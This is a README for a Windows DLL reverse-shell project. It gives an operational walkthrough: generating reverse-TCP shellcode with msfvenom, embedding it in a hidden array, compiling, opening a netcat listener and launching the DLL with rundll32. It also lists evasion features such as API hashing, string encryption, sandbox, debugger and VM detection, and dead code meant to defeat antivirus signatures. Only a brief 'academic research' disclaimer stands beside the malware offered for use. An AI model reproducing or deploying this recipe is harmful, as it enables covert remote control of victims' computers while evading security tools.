# Advanced Reverse Shell DLL

A Windows DLL that implements a reverse shell with advanced anti-analysis techniques.

## Features

- Dynamic API loading and hash-based API resolution
- Advanced string encryption and hiding mechanisms
- Anti-analysis and anti-debugging techniques
- Secure communication with AES encryption
- Dead code injection to prevent signature-based detection

## Quick Usage Guide

1. **Generate Shellcode:**
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=YOUR_PORT -f c
```

2. **Add Shellcode:**
- Copy the generated shellcode into `HIDDEN_CMD` array in `main.cpp`
- Replace the existing bytes in the array

3. **Compile:**
```bash
g++ -shared -o shelltest.dll src/loader/main.cpp -lws2_32 exports.def
```

4. **Start Listener:**
```bash
nc -lvp YOUR_PORT
```

5. **Run DLL:**
```bash
rundll32.exe shelltest.dll,StartShell
```

6. **Config (src/loader/config.ini):**
```ini
[Connection]
IP=YOUR_IP
Port=YOUR_PORT
```

Note: Make sure to use the same IP and port in both msfvenom command and config.ini

## Technical Details

### 1. API Hiding and Loading
- FNV-1a hash algorithm for API name encryption
- Dynamic API address resolution
- API caching system
- Random starting points to prevent signature-based detection

### 2. String Hiding
- XOR-based encryption
- Base64 encoding
- Random string fragmentation
- Dynamic string concatenation

### 3. Anti-Analysis Techniques
- Sandbox detection
- Debugger detection
- Virtual machine detection
- Time-based analysis prevention

### 4. Communication Security
- AES-256 encryption
- Dynamic key exchange
- Packet integrity check
- Connection hiding

## Security Warning

This project is designed solely for academic research and security testing purposes. Malicious use is prohibited. Please check local laws before using the project.

## License

This project is licensed under the MIT license. See the LICENSE file for details.
